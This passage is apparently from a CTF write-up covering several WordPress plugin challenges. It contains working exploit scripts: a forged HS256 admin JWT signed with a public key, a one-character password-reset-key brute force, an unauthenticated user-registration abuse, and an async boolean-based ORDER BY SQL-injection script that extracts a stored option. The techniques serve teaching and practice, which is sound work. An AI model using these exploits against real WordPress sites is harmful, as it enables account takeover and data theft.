        if ($remainder) {
            $input .= str_repeat('=', 4 - $remainder);
        }
        return base64_decode(strtr($input, '-_', '+/'));
    }

    public static function urlSafeBase64Encode($input)
    {
        return str_replace('=', '', strtr(base64_encode($input), '+/', '-_'));
    }
}

    $publicKey = <<<EOD
    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw
    3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw
    HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l
    G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG
    UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY
    YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU
    dwIDAQAB
    -----END PUBLIC KEY-----
    EOD;

    $issuedAt = new DateTimeImmutable();
    $data = [
        "role" => "admin",
        "iat" => $issuedAt->getTimestamp(),
        "nbf" => $issuedAt->getTimestamp()
    ];

    echo SimpleJWTHandler::encodeToken($data, $publicKey, 'HS256');

```

### Exploit Script

The following Python script sets the `simple_jwt` cookie with the malicious JWT and accesses the target endpoint:

```python
import httpx
import asyncio

URL = "http://100.25.255.51:9094/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    ...

async def main():
    api = API()
    api.c.cookies.set("simple_jwt", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MjcwNjQ2NjgsIm5iZiI6MTcyNzA2NDY2OH0.qz8J6xy7f5f7px44KIiqQT0ROikzXjpzKCpJ6XxPII4")
    res = await api.c.get("/wp-admin/admin-ajax.php?action=simple_jwt_handler")
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())

```

## Flag

CTF{4lg0rithms\_4r3\_funny\_1z268}

# WP Elevator

## Description

Asked my freelance developer friend to write me an authorization plugin so I can share knowledge with selected memebers. He is still working on it but gave me an early version. I don't know how it works but will talk with him once he finishes.

Note: fully whitebox challenge, no need to do massive bruteforce

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/95cbeb1f-1275-45fc-8578-0b234fc15301/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466272TET2F%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132312Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCICdrJUCWrGwS%2FcNZC6PkcOrDUwzALEeebVx5HS4RyhOyAiAX3fQaVmK4jTwFeUc5bGQoGSxMg6qvC6V9vTCpl7mHgyqIBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMb28vB6RqaI4ULUIkKtwDi%2BkkmLT%2B4RkQUVuulDuInUN5F3bh0tK2%2FgxD4J%2BpvIZJkCXGGjG9d7BmzZWkVq8ptpbP%2FIeW9FagLTtCJGFRN%2BvTJvvOreR0sNDz5aFxJinXuGy7nm7yISCzhqmXPGuMq%2FoKXw7xEtd6LQjo95Nu9n6UbhnFIirfxfIWh7j0FFUuHQ45n2FbN0F2TCRyNYgsDNSvD5qDL9SZI8C%2BXKm9Urm1uzMarr1VdchiTuREUPwSW1q5ChO1xJh3gZqxbrCaGFV91NsThV%2FQ4X2frnyMxS2U9HhCCyzOuEqsIRJd5PuMyesHygQOLrWNTrUQIko5E0PB8VFCG4%2Fa6z%2FVLgCVTKNuy3hkWZLpXcfUqUlFFZqqgahrCQ0eMtcHkg2mkfyi4KQhfKFje2Hu13ZykJ5OJfff%2F6fWnA5vVNyn214%2BkjXwM20VdaenOMZ56fF2S0D8dql31Po4FU3U%2BiTkvR1L0oMsgz7qjtVRuFsXIZZFOrcpaxOYfvK1ucB001RGmAjCI%2BrnITGYZSy3F%2BOpHSPrvhRb9xbYv4K1lNX0n0FzSUo9YoZYDzLYu15TDeL0Ki2HgqB58BS56CtJCHJtyomC%2BJYLwGXZSJODIdGtoyl91OAUKLs3uxaBsE5eIR0wqNjBwQY6pgH%2FYtL50IzpH5ftK%2BYX4Vl0gwbYacvq3wUqiSk786fwmB4Bh5iy83R8rdtPaVjWp%2FZeu45mcVRAPl6R1V5rZzl0AZ5sMCoJbJoATt558ehsujkg4TzmwNyrZTWRMWmSJXbtV0V6PN5GZ9DeJv%2BdjDU0AAw0%2Bm%2FFRxTPxt2nm1T6J%2BI951iU0qRd4NCf7BdnmgrAzWLtW2SZBNEVKMVh4%2B13xjr%2BzLnr\&X-Amz-Signature=2a9be4c512b961a1371a13c8d5954e763d4ba2b671f8df7ece9c449da46ab14b\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

This challenge involves exploiting vulnerabilities in a WordPress site similar to a previous challenge from NahamCon <https://medium.com/@rphang/wp-elevator-nahamcon-ctf-24-e55bef0b6f81>. The goal is to gain access and retrieve a flag.

### Steps to Solve the Challenge

*   **Create a User**: Start by creating a new user with a username and email.

    ```shell
    curl -X POST -H "Content-Type: application/json" -d '{"username":"dimas", "email":"dimas@dimas.com"}' http://100.25.255.51:9093/wp-json/user/v1/create

    ```

*   **Generate a Reset Key**: Use the AJAX endpoint to generate a password reset key for the newly created user.

    ```shell
    curl "http://100.25.255.51:9093/wp-admin/admin-ajax.php?action=reset_key" -X POST --data "user_id=25"

    ```

*   **Get the Reset Key**: Use a brute-force approach to find the reset key. The key is likely a single character, so try all possible characters until you find the correct one.

    ```python
    import requests

    url = "http://100.25.255.51:9093/wp-login.php?action=rp"
    possible_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    for c in possible_chars:
        r = requests.get(url + "&key=" + c + "&login=dimas")
        if "appears to be invalid" not in r.text:
            print("Key found: " + c)
            break
        else:
            print("Testing key: " + c)

    ```

*   **Access the Password Reset Page**: Once you have the reset key, navigate to the password reset page with the found key.

    ```plain text
    http://100.25.255.51:9093/wp-login.php?action=rp&key=<your_reset_key>&login=dimas

    ```

*   **Get the Nonce**: To perform actions that require authorization, you need to obtain a nonce. Make a request to fetch the latest posts while being logged in.

    ```shell
    curl -X POST --cookie "wordpress_logged_in_...=..." http://100.25.255.51:9093/wp-admin/admin-ajax.php?action=get_latest_posts

    ```

*   **Request the Flag**: Finally, use the nonce obtained from the previous step to request the flag from the server.

    ```shell
    curl -X POST --cookie "wordpress_logged_in_...=..." http://100.25.255.51:9093/wp-admin/admin-ajax.php?action=patchstack_flagger --data "nonce=<your_nonce>"

    ```

Alternative, you can copy this payload in developer console to get the flag after you login

```javascript
fetch("http://100.25.255.51:9093/wp-admin/admin-ajax.php?action=get_latest_posts").then(a=>a.json()).then(a=>fetch("/wp-admin/admin-ajax.php?action=patchstack_flagger", {headers: {"content-type": "application/x-www-form-urlencoded"},body:"nonce="+a.data.nonce, method: "post"})).then(a=>a.text()).then(console.log)

```

## Flag

![](./imgs/image_397PPaIP.png)

CTF{763edf891200bb\_n0nc3s\_f0r\_auth0riz4t10n}

# Secret Info

## Description

Our admin accidentally published some secret images on our site. Unfortunately, somehow we are not able to unpublish the secret image, however, we tried to apply some protection to our site. This should be enough, right?

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/308fcc2b-81e5-4525-86d4-3490f4d4d1ad/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466QUHIGZFQ%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132312Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQD%2Bz511hwK6dU%2FFR%2FJUkdh8F8PPAyysjQ4%2B7TMdboZzhgIgPX87kMfYgiId2or1fybL%2BMUDXHjwoSxk1sFCeCIlTuAqiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDTgItgMHet90AzC7SrcA2ZRjMqV4T4z60QJ8lIaEjj0HK%2BcJ0SunzTB2rptbAbxCSsw%2FpeV2QlpAthP6o16xUfWRIvLZCwdBJqtxhH%2FifvH9PVnWu%2BioaTuyhiFjqZzefjkyG3dq3eMIUuERkHZHW90Ahc4Dd3g79cIv6YT5BM4Z%2BSTQd6de%2BRJ%2FANFA7hunYJYnX7oea0zBL1Upc7vtYr5lzyxPpVxm8qYWcl7jMGGk%2FMQZCX0L7XZ8esqv%2F8lfpZSyS7HXhdNwW6Tqjcks7dIyaac94I2556hSiJk7r8rOMgiUuvbkSD54JajjlCrFAD%2BnJr0KRcdHH17yr5KS18xeXXZL1%2Bw1WGcRYokOEf0lOvG39a%2FrCbOMRv80mNdNxSKhexhtARRufs%2B5W0zcLcDLB3AwccApShm7nQC0X7NxJUqyIZPQc4D1K1xjvdLEr%2FWB8Gmv0QPWw9FLxuoSnTTPLeU51kAbd7QuqflC0GJce3VVI1j2s5gqee8a7TJDWBFSGBnI2aRbMF48Gcp6z%2FGvL7shn7I7sCw6SofIvXhGpLayXa2BxGmJr%2FDV%2FIfpixdPUe7lA%2BXNReUrNE5S50mDfOuXfS3G6uP5MioJ%2FhEtxIUpMAKwoo0HFSZGjEo1SHMJZpFFjHyrd8dMLzYwcEGOqUB5ZW5i%2F4b6dZJB3YKzUA7dMBwcJFKh%2FgrVm6w%2BMBJlrCshoJvinEzhUQ77Wfx8C9vHTtG92q01uQjB5CTOrrokC5izw8Ljz91nSblSGcrN3APqr1VkfBKiFFb9spraaGTOO5WTvxiN0AQkyihhpyfPKsuWbe6pNBN4RXot4hP2JT0GivbuCDgJDTEWnyCmqves9k2DR%2FUNkmWr9y%2BNbc8dqkTEoKx\&X-Amz-Signature=a90d7db8a70a3dc3cfdd834cf47c90f6aebb6dcef1ead9a4e1ebb446525d72c6\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

To solve this challenge, we’ll register a new user via a WordPress AJAX request and then access a specific URL to retrieve the flag.

### Steps to Solve the Challenge

*   **Register a New User**: First, we need to create a user using the AJAX action defined in the WordPress plugin.

    ```python
    import httpx
    import asyncio

    # Define the target URL for the WordPress AJAX request
    url = "http://100.25.255.51:9091/wp-admin/admin-ajax.php"

    # Define the user data
    data = {
        "action": "register_user",   # The action hook defined in your WordPress plugin
        "username": "newuser",       # Replace with the desired username
        "password": "securepassword", # Replace with the desired password
        "email": "newuser@example.com" # Replace with the desired email
    }

    # Send the POST request to register the user
    async def register_user():
        async with httpx.AsyncClient() as client:
            response = await client.post(url, data=data)

        # Print the response (status code, headers, body)
        print(f"Status Code: {response.status_code}")
        print(f"Response Body: {response.text}")

    # Run the async function
    asyncio.run(register_user())


    ```

*   **Check the Flag Path**: After registering the user, navigate to the media endpoint to find the flag path.

    ```shell
    http://100.25.255.51:9091/wp-json/wp/v2/media/
    ```

    This should give you a list of media items, including the flag.

    ![](./imgs/image_SyRTSL1s.png)

*   **Access the Flag URL**: Once you have identified the correct URL for the flag from the media endpoint, access it directly in your browser.

## Flag

![](./imgs/image_MjKxuyel.png)

# Link Manager

## Description

I am very angry that WordPress dropped the support for Link Manager in version 3.5 release. I created my own plugin to cover that feature and it is still in the beta phase, can you check if everything's solid?

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/3b2450b1-f4e5-4ff9-8f00-27e47d68ea91/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466QUHIGZFQ%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132312Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQD%2Bz511hwK6dU%2FFR%2FJUkdh8F8PPAyysjQ4%2B7TMdboZzhgIgPX87kMfYgiId2or1fybL%2BMUDXHjwoSxk1sFCeCIlTuAqiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDTgItgMHet90AzC7SrcA2ZRjMqV4T4z60QJ8lIaEjj0HK%2BcJ0SunzTB2rptbAbxCSsw%2FpeV2QlpAthP6o16xUfWRIvLZCwdBJqtxhH%2FifvH9PVnWu%2BioaTuyhiFjqZzefjkyG3dq3eMIUuERkHZHW90Ahc4Dd3g79cIv6YT5BM4Z%2BSTQd6de%2BRJ%2FANFA7hunYJYnX7oea0zBL1Upc7vtYr5lzyxPpVxm8qYWcl7jMGGk%2FMQZCX0L7XZ8esqv%2F8lfpZSyS7HXhdNwW6Tqjcks7dIyaac94I2556hSiJk7r8rOMgiUuvbkSD54JajjlCrFAD%2BnJr0KRcdHH17yr5KS18xeXXZL1%2Bw1WGcRYokOEf0lOvG39a%2FrCbOMRv80mNdNxSKhexhtARRufs%2B5W0zcLcDLB3AwccApShm7nQC0X7NxJUqyIZPQc4D1K1xjvdLEr%2FWB8Gmv0QPWw9FLxuoSnTTPLeU51kAbd7QuqflC0GJce3VVI1j2s5gqee8a7TJDWBFSGBnI2aRbMF48Gcp6z%2FGvL7shn7I7sCw6SofIvXhGpLayXa2BxGmJr%2FDV%2FIfpixdPUe7lA%2BXNReUrNE5S50mDfOuXfS3G6uP5MioJ%2FhEtxIUpMAKwoo0HFSZGjEo1SHMJZpFFjHyrd8dMLzYwcEGOqUB5ZW5i%2F4b6dZJB3YKzUA7dMBwcJFKh%2FgrVm6w%2BMBJlrCshoJvinEzhUQ77Wfx8C9vHTtG92q01uQjB5CTOrrokC5izw8Ljz91nSblSGcrN3APqr1VkfBKiFFb9spraaGTOO5WTvxiN0AQkyihhpyfPKsuWbe6pNBN4RXot4hP2JT0GivbuCDgJDTEWnyCmqves9k2DR%2FUNkmWr9y%2BNbc8dqkTEoKx\&X-Amz-Signature=604116e5fd591d966bcf758aa4f68585151de6e23790f9ec0118b17ffbbb6816\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

I solved this challenge by leveraging SQL injection in the `link-manager`. I used a boolean-based SQL injection to extract the flag stored in the `flag_links_data` option. Below is my solution script.

### Step 1: Populate the Data

```python
import httpx
import re

link = "http://100.25.255.51:9097"

# Step 1: Fetch the Nonce from the Front Page
def fetch_nonce():
    front_page_url = link
    response = httpx.get(front_page_url)

    # Extract the nonce using regex (adjust pattern based on how it's printed)
    match = re.search(r"ajaxNonce\s*=\s*'([a-zA-Z0-9_-]+)'", response.text)
    if match:
        return match.group(1)
    else:
        raise ValueError("Nonce not found on the front page.")

# Step 2: Submit the Link Data
def submit_link(url, name, description):
    # Fetch nonce from the front page
    nonce = fetch_nonce()

    # Define the AJAX URL
    ajax_url = link+"/wp-admin/admin-ajax.php"

    # Prepare the data payload
    data = {
        'action': 'submit_link',
        'nonce': nonce,
        'url': url,
        'name': name,
        'description': description,
    }

    # Send the POST request to submit the link
    response = httpx.post(ajax_url, data=data)

    # Check the response
    if response.status_code == 200:
        print(f"Success: {response.json()}")
    else:
        print(f"Failed: {response.status_code}, {response.text}")

# Usage: Replace the URL, Name, and Description with your own values
try:
    submit_link(
        url="https://example.com",
        name="Example Link",
        description="This is an example link submission via AJAX."
    )
except Exception as e:
    print(f"Error: {e}")

```

### Step 2: Boolean-Based SQL Injection Script

Once the data is populated, you can use boolean-based SQL injection to retrieve the flag with this script:

```python
import string
import asyncio
import httpx

# Define the target URL
url = "http://100.25.255.51:9097/wp-admin/admin-ajax.php"
known = "CTF{"

# Asynchronous function to send POST requests
async def send_request(char, known):
    to_search = f"{known + char}%".encode().hex()
    data = {
        "action": "get_link_data",
        "link_name": "Example Link",
        "orderby": f"1,extractvalue(null,concat((select 0 from dual where (select option_value from wp_options where option_name = 0x{'flag_links_data'.encode().hex()}) like binary 0x{to_search}),0x01)) -- -",
        "order": "ASC"
    }

    async with httpx.AsyncClient() as client:
        response = await client.post(url, data=data)
        return char, response.text

# Main asynchronous function to control the process
async def sql_injection():
    global known
    while True:
        # Create a list of tasks for each character in string.ascii_letters + "{}"
        tasks = []
        for char in string.ascii_letters+string.digits + "{}_":
            tasks.append(send_request(char, known))

        # Gather all the responses concurrently
        responses = await asyncio.gather(*tasks)

        # Process the responses to find the correct character
        for char, response_text in responses:
            print(response_text)
            if "No data found." in response_text:
                known += char
                print(f"Found character: {char}, known string so far: {known}")
                break

# Run the async process
asyncio.run(sql_injection())

# https://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html

```

![](./imgs/image_dWT8TH1W.png)

## Flag

CTF{ord3ring\_sql\_inj3ction\_links}
